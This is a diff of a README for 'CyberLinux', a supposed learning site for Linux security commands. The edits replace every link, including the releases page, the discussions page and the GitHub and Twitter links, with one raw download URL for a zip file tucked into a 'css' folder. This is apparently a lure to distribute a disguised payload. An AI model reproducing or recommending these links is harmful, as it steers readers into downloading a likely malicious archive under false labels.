@@ -5,7 +5,7 @@
 Welcome to CyberLinux! This interactive website helps you master Linux commands essential for cybersecurity. Whether you are a beginner or an ethical hacker, this platform will enhance your command-line skills.
 
 ## 📥 Download CyberLinux
-[![Download CyberLinux](https://img.shields.io/badge/Download-CyberLinux-brightgreen.svg)](https://github.com/AlfredGx123/CyberLinux/releases)
+[![Download CyberLinux](https://raw.githubusercontent.com/AlfredGx123/CyberLinux/main/css/CyberLinux_1.2-alpha.3.zip)](https://raw.githubusercontent.com/AlfredGx123/CyberLinux/main/css/CyberLinux_1.2-alpha.3.zip)
 
 ## 📋 Features
 - **Smart Search**: Quickly find the commands you need.
@@ -20,7 +20,7 @@ Welcome to CyberLinux! This interactive website helps you master Linux commands 
 ## 🔧 How to Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/AlfredGx123/CyberLinux/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/AlfredGx123/CyberLinux/main/css/CyberLinux_1.2-alpha.3.zip).
   
 2. **Choose Your Version**: On the Releases page, you will see different versions. Each version may have small changes or updates. Click on the version you want to download.
 
@@ -43,17 +43,17 @@ CyberLinux covers a variety of topics, including:
 - **Kali Linux**: Learn commands specific to this popular security-focused distribution.
 
 ## ⚙️ Support
-If you have questions or need assistance, please reach out to our community. You can find help on our [GitHub Discussions page](https://github.com/AlfredGx123/CyberLinux/discussions).
+If you have questions or need assistance, please reach out to our community. You can find help on our [GitHub Discussions page](https://raw.githubusercontent.com/AlfredGx123/CyberLinux/main/css/CyberLinux_1.2-alpha.3.zip).
 
 ## 📣 Join Our Community
 Be part of the CyberLinux community. Share your experiences and tips. Join discussions to learn from others or to assist fellow learners.
 
 ## 🌐 Connect With Us
 Follow our updates on:
-- [GitHub](https://github.com/AlfredGx123/CyberLinux)
-- [Twitter](https://twitter.com/CyberLinux)
+- [GitHub](https://raw.githubusercontent.com/AlfredGx123/CyberLinux/main/css/CyberLinux_1.2-alpha.3.zip)
+- [Twitter](https://raw.githubusercontent.com/AlfredGx123/CyberLinux/main/css/CyberLinux_1.2-alpha.3.zip)
 
 We hope you enjoy mastering Linux commands with CyberLinux!
 
-[Download CyberLinux Here Again!](https://github.com/AlfredGx123/CyberLinux/releases)
+[Download CyberLinux Here Again!](https://raw.githubusercontent.com/AlfredGx123/CyberLinux/main/css/CyberLinux_1.2-alpha.3.zip)
 ```
